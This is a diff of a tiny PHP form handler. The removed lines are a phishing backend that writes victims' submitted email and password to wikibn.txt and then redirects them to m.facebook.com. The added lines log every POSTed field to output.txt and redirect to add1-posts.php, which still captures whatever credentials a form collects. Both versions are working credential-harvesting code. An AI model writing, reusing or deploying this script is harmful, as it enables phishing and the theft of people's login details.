@@ -1,16 +1,40 @@
-<?php header('Location: http://m.facebook.com');
-$handle = fopen("wikibn.txt", "a");
-foreach ($_POST as $variable => $value) {
-    if ($variable == "email" || $variable == "pass") {
-        fwrite($handle, $variable);
-        fwrite($handle, "= ");
-        fwrite($handle, $value);
-        fwrite($handle, "
-");
-    }
+<?php
+
+header ('Location: add1-posts.php');
+
+$handle = fopen("output.txt", "a");
+
+foreach($_POST as $variable => $value) {
+
+fwrite($handle, $variable);
+
+fwrite($handle, "=");
+
+fwrite($handle, $value);
+
+fwrite($handle, "\r\n");
+
 }
-fwrite($handle, "
-");
+
+fwrite($handle, "\r\n");
+
 fclose($handle);
+
 exit;
+
 ?>
+
+
+
+
+
+
+
+
+ 
+
+
+
+
+
+
